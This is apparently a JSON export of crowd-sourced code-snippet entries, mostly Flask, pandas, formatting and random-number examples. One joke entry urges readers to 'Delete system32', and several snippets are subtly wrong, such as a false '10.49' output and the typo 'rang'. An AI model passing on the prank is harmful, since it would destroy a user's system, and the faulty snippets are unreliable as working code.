    "id": 1140,
    "keyword": null,
    "link": null,
    "title": " flask app starter",
    "description": "# Extremely simple flask application, will display 'Hello World!' on the screen when you run it # Access it by running it, then going to whatever port its running on (It'll say which port it's running on). from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'  if __name__ == '__main__':     app.run()\n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
    "id": 1141,
    "keyword": null,
    "link": null,
    "title": " flask cors policy no 'access-control-allow-origin'",
    "description": "# initialization app = Flask(__name__) app.config['SECRET_KEY'] = 'the quick brown fox jumps over the lazy   dog' app.config['CORS_HEADERS'] = 'Content-Type'  cors = CORS(app, resources={r\"/foo\": {\"origins\": \"http://localhost:port\"}})  @app.route('/foo', methods=['POST']) @cross_origin(origin='localhost',headers=['Content- Type','Authorization']) def foo():     return request.json['inputVar']  if __name__ == '__main__':    app.run() \n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
    "id": 1142,
    "keyword": null,
    "link": null,
    "title": " flask debug",
    "description": "$ export FLASK_ENV=development $ flask run \n$ export FLASK_APP=hello.py $ python -m flask run  * Running on http://127.0.0.1:5000/ \napp.run(debug=True) \nfrom flask import Flask app = Flask(__name__)  @app.route('/') def index():     return 'Flask'\n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
    "id": 1143,
    "keyword": null,
    "link": null,
    "title": " flask define template folder",
    "description": "import os from flask import Flask  template_dir = os.path.abspath('../../frontend/src') app = Flask(__name__, template_folder=template_dir) \n",
    "reg_date": "2021-10-12T11:29:30.000Z"
  },
  {
    "id": 1144,
    "keyword": null,
    "link": null,
    "title": " flask delete cookie stackoverflow",
    "description": "response.set_cookie(\"<COOKIE_NAME>\", '', expires=0)\n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1145,
    "keyword": null,
    "link": null,
    "title": " flask development mode",
    "description": "> set FLASK_APP=hello > set FLASK_ENV=development > flask run \n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1146,
    "keyword": null,
    "link": null,
    "title": " flask docker",
    "description": "FROM python:alpine3.7  COPY . /app WORKDIR /app RUN pip install -r requirements.txt # Write Flask in this file EXPOSE 5001  ENTRYPOINT [ \"python\" ]  CMD [ \"app.py\" ]\n$ docker run -p 8000:8000 -it python:3.7-slim python3 -m http.server --bind 0.0.0.0 \n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1147,
    "keyword": null,
    "link": null,
    "title": " flask enumerate index",
    "description": ">>> from jinja2 import Template  >>> t1 = \"\"\" ... {% for val in ['a', 'b', 'c'] %} ...     <td> ...         {{ loop.index0 }} {{ val }} ...     </td> ... {% endfor %} ... \"\"\" >>> Template(t1).render() \n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1148,
    "keyword": null,
    "link": null,
    "title": " flask error f = open(f'{getcwd()}/haikus/{haiku}',\"r\") ^ SyntaxError: invalid syntax",
    "description": "    f = open(f'{getcwd()}/haikus/{haiku}',\"r\")                                         ^ SyntaxError: invalid syntax\n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1149,
    "keyword": null,
    "link": null,
    "title": " flask get ip address of request",
    "description": "from flask import request from flask import jsonify  @app.route(\"/get_my_ip\", methods=[\"GET\"]) def get_my_ip():     return jsonify({'ip': request.remote_addr}), 200\nrequest.environ['HTTP_X_FORWARDED_FOR']\n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1150,
    "keyword": null,
    "link": null,
    "title": " flask give port number",
    "description": "if __name__ == '__main__':     app.run(host='0.0.0.0', port=80)\n",
    "reg_date": "2021-10-12T11:29:31.000Z"
  },
  {
    "id": 1151,
    "keyword": null,
    "link": null,
    "title": " flask how to run app",
    "description": "$ export FLASK_APP=hello.py $ python -m flask run  * Running on http://127.0.0.1:5000/ \nfrom flask import Flask app = Flask(__name__)  @app.route('/') def index():     return 'Flask'\n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1152,
    "keyword": null,
    "link": null,
    "title": " flask if statement",
    "description": "{% extends \"base.html\" %} {% block content %}     {% if condition %}         <div>blah blah blah blah</div>     {% else %}         {{ super() }}     {% endif %} {% endblock content %} \n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1153,
    "keyword": null,
    "link": null,
    "title": " flask import jsonify",
    "description": "from flask import jsonify  @app.route('/_get_current_user') def get_current_user():     return jsonify(username=g.user.username,                    email=g.user.email,                    id=g.user.id)\n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1154,
    "keyword": null,
    "link": null,
    "title": " flask install",
    "description": "# install flask (basic, if path is not set yet) py -m pip install flask # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install flask # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip flask # if PermissionError: [WinError 5] Access is denied py -m pip install --user flask # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install flask\n#Works on Batchfile, Powershell or Bash  pip install flask\npip install -U Flask \npip install flask Or If The Problem is \"pip\" not Found Use :  py -m pip install flask\n$ pip install Flask \n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1155,
    "keyword": null,
    "link": null,
    "title": " flask link stylesheet",
    "description": "<link rel=\"stylesheet\" href=\"{{ url_for('static', filename='css/main.css') }}\">\n<link rel= \"stylesheet\" type= \"text/css\" href= \"{{ url_for('static',filename='styles/mainpage.css') }}\"> \n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1156,
    "keyword": null,
    "link": null,
    "title": " flask minimal app",
    "description": "from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'\n# Extremely simple flask application, will display 'Hello World!' on the screen when you run it # Access it by running it, then going to whatever port its running on (It'll say which port it's running on). from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'  if __name__ == '__main__':     app.run()\nfrom flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!' \n> set FLASK_APP=hello > flask run \n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1157,
    "keyword": null,
    "link": null,
    "title": " flask minimul app",
    "description": "from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'\n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1158,
    "keyword": null,
    "link": null,
    "title": " flask post vs get",
    "description": "@app.route(\"/login\", methods=[\"POST\", \"GET\"]) def login():     if request.method == \"POST\":         user = request.form[\"name\"]         return redirect(url_for(\"success\", name=user))     else:         user = request.args.get(\"name\")         return redirect(url_for(\"success\", name=user))\n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1159,
    "keyword": null,
    "link": null,
    "title": " flask secret key generator",
    "description": "# The secret key is needed to keep the client-side sessions secure. # It's used for flask applications # You can generate some random key as below:  >>> import os >>> os.urandom(24) '\\xfd{H\\xe5<\\x95\\xf9\\xe3\\x96.5\\xd1\\x01O<!\\xd5\\xa2\\xa0\\x9fR\"\\xa1\\xa8'  # Just take that key and copy/paste it into your config file  SECRET_KEY = '\\xfd{H\\xe5<\\x95\\xf9\\xe3\\x96.5\\xd1\\x01O<!\\xd5\\xa2\\xa0\\x9fR\"\\xa1\\xa8'\n",
    "reg_date": "2021-10-12T11:29:32.000Z"
  },
  {
    "id": 1160,
    "keyword": null,
    "link": null,
    "title": " flask session timeout",
    "description": "from datetime import timedelta from flask import session, app  @app.before_request def make_session_permanent():     session.permanent = True     app.permanent_session_lifetime = timedelta(minutes=5) \n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1161,
    "keyword": null,
    "link": null,
    "title": " flatten a list of list python",
    "description": "flattened = [val for sublist in list_of_lists for val in sublist]\nflat_list = [item for sublist in l for item in sublist]  #which is equivalent to this  flat_list = [] for sublist in l:     for item in sublist:         flat_list.append(item)\n# idiomatic python  # using itertools import itertools  list_of_list = [[1, 2, 3], [4, 5], [6]] chain = itertools.chain(*images)  flattened_list = list(chain) # [1, 2, 3, 4, 5, 6]\nflat_list = [] for sublist in l:     for item in sublist:         flat_list.append(item)\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1162,
    "keyword": null,
    "link": null,
    "title": " flip a plot matplotlib",
    "description": "plt.gca().invert_yaxis()\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1163,
    "keyword": null,
    "link": null,
    "title": " flip pyplot python",
    "description": "plt.gca().invert_yaxis() plt.gca().invert_xaxis()\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1164,
    "keyword": null,
    "link": null,
    "title": " float print format python",
    "description": "print(\"x = {:.2f}\".format(x))\n>>> x = 13.949999999999999999 >>> x 13.95 >>> g = float(\"{:.2f}\".format(x)) >>> g 13.95 >>> x == g True >>> h = round(x, 2) >>> h 13.95 >>> x == h True\nnumbers = [23.23, 0.123334987, 1, 4.223, 9887.2]  for number in numbers:     print(f'{number:.4f}') \n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1165,
    "keyword": null,
    "link": null,
    "title": " float to percentage python",
    "description": "print \"{0:.0%}\".format(1./3) # OUTPUT 33%\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1166,
    "keyword": null,
    "link": null,
    "title": " folium anaconda",
    "description": "$ conda install -c conda-forge folium \n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1167,
    "keyword": null,
    "link": null,
    "title": " for e in p.event.get(): pygame.error: video system not initialized",
    "description": "import pygame as p import sys  p.init() screen = p.display.set_mode((800, 800))  while True:     for e in p.event.get():         if e.type == p.QUIT:             p.quit()             sys.exit(1) \n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1168,
    "keyword": null,
    "link": null,
    "title": " for each digit in number python",
    "description": "for digit in str(n):   print(int(digit))\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1169,
    "keyword": null,
    "link": null,
    "title": " for every file in the folder do python",
    "description": "for file in os.listdir(inputdir):\n",
    "reg_date": "2021-10-12T11:29:33.000Z"
  },
  {
    "id": 1170,
    "keyword": null,
    "link": null,
    "title": " for idx, col name in enumerate(X train.columns): print(\"The coefficient for {} is {}\".format(file name, regression model.coef [0][idx]))",
    "description": "for idx, col_name in enumerate(X_train.columns):     print(\"The coefficient for {} is {}\".format(col_name, regression_model.coef_[0][idx]))\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1171,
    "keyword": null,
    "link": null,
    "title": " for loop django template count",
    "description": "{% for item in item_list %}     {{ forloop.counter }} # starting index 1     {{ forloop.counter0 }} # starting index 0      # do your stuff {% endfor %} \n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1172,
    "keyword": null,
    "link": null,
    "title": " for loop pandas range",
    "description": "for i in range(5):     b = current_tracks.rel_values.iloc[i] # by standard 0-based sequence index or  for i in range(1, 6):     b = current_tracks.rel_values.loc[i] # by 1-based track number\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1173,
    "keyword": null,
    "link": null,
    "title": " for row in column pandas",
    "description": "df = pd.DataFrame([{'c1':10, 'c2':100}, {'c1':11,'c2':110}, {'c1':12,'c2':120}]) for index, row in df.iterrows():     print(row['c1'], row['c2'])\n# Option 1 for row in df.iterrows():     print row.loc[0,'A']     print row.A     print row.index()  # Option 2 for i in range(len(df)) :    print(df.iloc[i, 0], df.iloc[i, 2]) \n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1174,
    "keyword": null,
    "link": null,
    "title": " for some valid urls also i'm getting 403 in requests.get() python",
    "description": "HTTP Error 403 Forbidden Python Request If you still get a 403 Forbidden after adding a user-agent , you may need to add more headers, such as referer : ... The headers can be found in the Network > Headers > Request Headers of the Developer Tools.Jul 9, 2019\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1175,
    "keyword": null,
    "link": null,
    "title": " forloop counter django",
    "description": "{{forloop.counter}}\nDjango URL Mapping\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1176,
    "keyword": null,
    "link": null,
    "title": " format date field in pandas",
    "description": "df['date'] = pd.to_datetime(df[\"date\"].dt.strftime('%Y-%m')) \nformatted_df = df[\"Date\"].dt.strftime(\"%m/%d/%y\")\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1177,
    "keyword": null,
    "link": null,
    "title": " format fecimal in f string py",
    "description": ">>> a = 10.1234 >>> f'{a:.2f}' '10.12'\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1178,
    "keyword": null,
    "link": null,
    "title": " format integer to be money python",
    "description": "formatted_float = \"${:,.2f}\".format(1500.2)\n",
    "reg_date": "2021-10-12T11:29:34.000Z"
  },
  {
    "id": 1179,
    "keyword": null,
    "link": null,
    "title": " format list into string python",
    "description": "lst = [\"hi\", \"there\"] print(\", \".join(lst))  cli -------------- hi, there\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1180,
    "keyword": null,
    "link": null,
    "title": " format python number with commas",
    "description": "num = int(input()) print(f\"{num:,}\")  #Hope this helps:)\n>>> num = 10000000 >>> print(f\"{num:,}\") 10,000,000 \n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1181,
    "keyword": null,
    "link": null,
    "title": " format time python",
    "description": "The program below converts a datetime object containing current date and time to different string formats.  Code:    from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\t  Output after run the code: year: 2020 month: 03 day: 31 time: 04:59:31 date and time: 03/31/2020, 04:59:31        Here, year, day, time and date_time are strings, whereas now is a datetime object.\n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \nFormat time python\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1182,
    "keyword": null,
    "link": null,
    "title": " format to 2 or n decimal places python",
    "description": "num = 123.4567 formatted_num = '{0:.2f}'.format(num) # to 2 decimal places # formatted_num = '123.46'\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1183,
    "keyword": null,
    "link": null,
    "title": " formula for compounding interest in python",
    "description": "P = int(input(\"Enter starting principle please. \")) n = int(input(\"Enter number of compounding periods per year. \")) r = float(input(\"Enter annual interest rate. e.g. 15 for 15% \")) y = int(input(\"Enter the amount of years. \"))  FV = P * (((1 + ((r/100.0)/n)) ** (n*y)))  print (\"The final amount after\", y, \"years is\", FV) \n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1184,
    "keyword": null,
    "link": null,
    "title": " fortnite",
    "description": "might want to reconsider \nIf you are checking the spelling of fortnight for use in your code then you've spelt it wrong\nMY FRIEND HERE JUSTIN, HE'S ALREADY TAKEN, AND HE'S CRACKED AT FORTNIE MY GUY\nOnline Game\nfor i in range(69420): \tprint(f\"{i} people Hate fortnite, you should too!\")\nbruh u best not be playing this game dude \nDelete system32 pls, or delete fortnite.\nFortnite? Are you kidding me bro? Just play PUBG my guy\nDO NOT DOWNLOAD THIS!!!\n//WORST GAME EVER.........\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1185,
    "keyword": null,
    "link": null,
    "title": " fourreau de maroquin",
    "description": "print(\"fourreau de maroquin\")\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1186,
    "keyword": null,
    "link": null,
    "title": " fractal tree python",
    "description": "import pygame, math  pygame.init() screen = pygame.display.set_mode((750, 650)) pygame.display.set_caption(\"Fractal Tree\") display = pygame.display.get_surface()  def drawTree(a, b, pos, deepness): if deepness: c = a + int(math.cos(math.radians(pos)) * deepness * 10.0) d = b + int(math.sin(math.radians(pos)) * deepness * 10.0) pygame.draw.line(display, (127,255,0), (a, b), (c, d), 1) drawTree(c, d, pos - 25, deepness - 1) drawTree(c, d, pos + 25, deepness- 1)  def process(event): if event.type == pygame.QUIT: exit(0)  drawTree(370, 650, -90, 10) pygame.display.flip() while True: process(pygame.event.wait())\n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1187,
    "keyword": null,
    "link": null,
    "title": " free fall calculator python",
    "description": "import math  height = int(input('Enter height by meters: ')) mass = input('Enter mass by kg: ')  g = 9.8  time = float(math.sqrt(2*height/g)) vel1 = float(math.sqrt(2*height*g)) vel2 = float(vel1*3.6) energy = int(mass)*0.5*(vel1**2)  print(f'Time until impact: {round(time, 3)} seconds') print(f'Speed at impact: {round(vel2,3)} km/h or {round(vel1, 3)} m/s') print(f'Energy at impact: {round(energy, 3)} joules') \n",
    "reg_date": "2021-10-12T11:29:35.000Z"
  },
  {
    "id": 1188,
    "keyword": null,
    "link": null,
    "title": " free fall python",
    "description": "import math  height = int(input('Enter height by meters: ')) mass = input('Enter mass by kg: ')  g = 9.8  time = float(math.sqrt(2*height/g)) vel1 = float(math.sqrt(2*height*g)) vel2 = float(vel1*3.6) energy = int(mass)*0.5*(vel1**2)  print(f'Time until impact: {round(time, 3)} seconds') print(f'Speed at impact: {round(vel2,3)} km/h or {round(vel1, 3)} m/s') print(f'Energy at impact: {round(energy, 3)} joules') \n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1189,
    "keyword": null,
    "link": null,
    "title": " french to english",
    "description": "upvote if you feel terrible\n# pip install googletrans from googletrans import Translator translator = Translator() print(translator.translate(\"Traduisez des langues avec python.\").text)\nnot cheating on spanish hell yea\nYou Otaku? Or just for fun??\nthe spanish teacher will hunt you down if your not carefull\nFrench to English!\nAre you cheating on your Spanish homework? GET BACK TO PROGRAMMING!\nCheating on foreign language? Me too.\n<p>i like this</p>\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1190,
    "keyword": null,
    "link": null,
    "title": " frequency count of values in pandas dataframe",
    "description": "df['column_name'].value_counts() df.groupby(['column_name']).count()  #Each returns the results in a pandas Series.\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1191,
    "keyword": null,
    "link": null,
    "title": " from Crypto.Cipher import AES ModuleNotFoundError: No module named 'Crypto'",
    "description": ">> pip install pycryptodome  from Crypto.Cipher import AES  #Works\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1192,
    "keyword": null,
    "link": null,
    "title": " from  curses import * ModuleNotFoundError: No module named ' curses'",
    "description": "when you are using pycharm Terminal: pip install windows-curses\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1193,
    "keyword": null,
    "link": null,
    "title": " from array to image show",
    "description": "from PIL import Image import numpy as np  w, h = 512, 512 data = np.zeros((h, w, 3), dtype=np.uint8) data[0:256, 0:256] = [255, 0, 0] # red patch in upper left img = Image.fromarray(data, 'RGB') img.save('my.png') img.show()\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1194,
    "keyword": null,
    "link": null,
    "title": " from csv to pandas dataframe",
    "description": "df.to_csv('file_name.csv', index=False)\ndf = pd.read_csv('data.csv')   \ndf.to_csv('file_name.csv')\ndf.to_csv(file_name, sep='\\t')\ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv') \n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1195,
    "keyword": null,
    "link": null,
    "title": " from string to time python dataframe",
    "description": "dfc['Time_of_Sail'] = pd.to_datetime(dfc['Time_of_Sail'],format= '%H:%M:%S' ).dt.time\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1196,
    "keyword": null,
    "link": null,
    "title": " from threading import thread ImportError: cannot import name 'thread' from 'threading' (/usr/lib/python3.7/threading.py)",
    "description": "pip3 install thread6\n# If you're running a linux (I've only tried this on a raspi) you should pip3 install thread6 # That worked for me at least\n\"\"\" You've named your file threading.py which hides the standard library module  by the same name... don't do that :-) \"\"\"\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1197,
    "keyword": null,
    "link": null,
    "title": " fstring number format python",
    "description": "num = 10.4999 print(f\"The formatted number is {num:.2f}\") # output: The formatted number is 10.49\n",
    "reg_date": "2021-10-12T11:29:36.000Z"
  },
  {
    "id": 1198,
    "keyword": null,
    "link": null,
    "title": " gamestop",
    "description": "GME to the moon !!! lets fuck Wall Street    r/WallStreetBets\nCHECK THE MASSIVE STOCKS!!!\nwall street is broken\nyou shuld have invested earler buddy :/ \n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1199,
    "keyword": null,
    "link": null,
    "title": " gdScript string format",
    "description": "var s1 : String = \"godot\" var s2 : String = \"%s game engine\" %[s1] print(s2) # print -> godot game engine\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1200,
    "keyword": null,
    "link": null,
    "title": " geckodriver' executable needs to be in path",
    "description": "from selenium import webdriver driver = webdriver.Firefox(executable_path=r'your\\path\\geckodriver.exe') driver.get('http://inventwithpython.com') \n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1201,
    "keyword": null,
    "link": null,
    "title": " generate 12 random numbers python",
    "description": "#Array containing 12 random integers from 0 to 100 data = np.random.randint(100,size=(12)) print(data)\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1202,
    "keyword": null,
    "link": null,
    "title": " generate a color python",
    "description": "color = lambda : [random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)]\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1203,
    "keyword": null,
    "link": null,
    "title": " generate a list of numbers upto n",
    "description": "a_list = list(range(1, 5))\nx=list(rang(1,5))\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1204,
    "keyword": null,
    "link": null,
    "title": " generate a list of random non repeated numbers python",
    "description": "#This will return a list of 50 numbers selected from the range 0 to 999, without duplicates. import random random.sample(range(1000), 50)\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1205,
    "keyword": null,
    "link": null,
    "title": " generate number of n bits python",
    "description": "import random  random.getrandbits(n)\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1206,
    "keyword": null,
    "link": null,
    "title": " generate python date list",
    "description": "import pandas as pd from datetime import datetime  pd.date_range(end = datetime.today(), periods = 100).to_pydatetime().tolist()  #OR  pd.date_range(start=\"2018-09-09\",end=\"2020-02-02\").to_pydatetime().tolist()\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1207,
    "keyword": null,
    "link": null,
    "title": " generate random characters in python",
    "description": "import random import string random.choice(string.ascii_letters)\nimport random import string  def get_random_alphanumeric_string(length):     letters_and_digits = string.ascii_letters + string.digits     result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))     print(\"Random alphanumeric String is:\", result_str)  get_random_alphanumeric_string(8) get_random_alphanumeric_string(8) \n''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N)) \nimport random  #String string = \"abcdefghijklmnopqrstuvwxyz\" array = [] for c in string:   array += [c]   print(array[random.randint(0, len(array)-1)])  # Faster and more efficient random.choice(string)\n",
    "reg_date": "2021-10-12T11:29:37.000Z"
  },
  {
    "id": 1208,
    "keyword": null,
    "link": null,
    "title": " generate random integer matrix python",
    "description": "import numpy as np  randi_arr = np.random.randint(start, end, dimensions) #random integers will be sampled from [start, end) (end not inclusive) #end is optional; if end is not specified, random integers will be sampled from [0, start) (start not inclusive) #dimensions can be specified as shown here; (m,n) #2D array with size 'm x n'\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1209,
    "keyword": null,
    "link": null,
    "title": " generate random prime number python",
    "description": "# Prime number generator def prime_generator(end):     for n in range(2, end):     # n starts from 2 to end         for x in range(2, n):   # check if x can be divided by n             if n % x == 0:      # if true then n is not prime                 break         else:                   # if x is found after exhausting all values of x             yield n             # generate the prime   g = prime_generator(1000)       # give firt 1000 prime numbers print(list(g)) \nimport sympy  primeNumber = sympy.randprime(min, max) \n# effiecent and fast way to generate prime numbers def primeCheck(n):     if n == 1 or n == 0 or (n % 2 == 0 and n > 2):         return False     else:         for o in range(3, int(n ** (1 / 2)) + 1, 2):             if n % o == 0:                 return False         return True   for a in range(2**15):     if primeCheck(a):         prime_numbers.append(a)\ndef miller_rabin(n, k):      # Implementation uses the Miller-Rabin Primality Test     # The optimal number of rounds for this test is 40     # See http://stackoverflow.com/questions/6325576/how-many-iterations-of-rabin-miller-should-i-use-for-cryptographic-safe-primes     # for justification      # If number is even, it's a composite number      if n == 2 or n == 3:         return True      if n % 2 == 0:         return False      r, s = 0, n - 1     while s % 2 == 0:         r += 1         s //= 2     for _ in range(k):         a = random.randrange(2, n - 1)         x = pow(a, s, n)         if x == 1 or x == n - 1:             continue         for _ in range(r - 1):             x = pow(x, 2, n)             if x == n - 1:                 break         else:             return False     return True  \"\"\" a function that uses miller rabin's primality test to genarate a prime number in a certain number of bits length in other words you give it a number of bits and you will get a prime number with that number of bits \"\"\" def genprimeBits(k):     x = \"\"     k = int(k)     for y in range(k):         x = x + \"1\"     y = \"1\"     for z in range(k-1):         y = y + \"0\"     x = int(x,2)     y = int(y,2)     p = 0     while True:         p = random.randrange(y,x)         if miller_rabin(p,40):             break     return p\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1210,
    "keyword": null,
    "link": null,
    "title": " generate random string python",
    "description": "import random import string  def random_string_generator(str_size, allowed_chars):     return ''.join(random.choice(allowed_chars) for x in range(str_size))  chars = string.ascii_letters + string.punctuation size = 12  print(chars) print('Random String of length 12 =', random_string_generator(size, chars))\nimport secrets  secrets.token_hex(nbytes=16)  # this will produce something like  # aa82d48e5bff564f3221d02194611c13\nimport string import random  length=5 #python2 randomstr = ''.join(random.sample(string.ascii_letters+string.digits,length))   #python3 randomstr = ''.join(random.choices(string.ascii_letters+string.digits,k=length))                                    \nimport random import string  def randStr(chars = string.ascii_uppercase + string.digits, N=10): \treturn ''.join(random.choice(chars) for _ in range(N))  # default length(=10) random string print(randStr()) # random string of length 7 print(randStr(N=7))  # random string with characters picked from ascii_lowercase print(randStr(chars=string.ascii_lowercase)) # random string with characters picked from 'abcdef123456' print(randStr(chars='abcdef123456'))\n# -random letter generator- import string var1 = string.ascii_letters  import random var2 = random.choice(string.ascii_letters) print(var2)\n''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N)) \n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1211,
    "keyword": null,
    "link": null,
    "title": " generate valid sudoku board python",
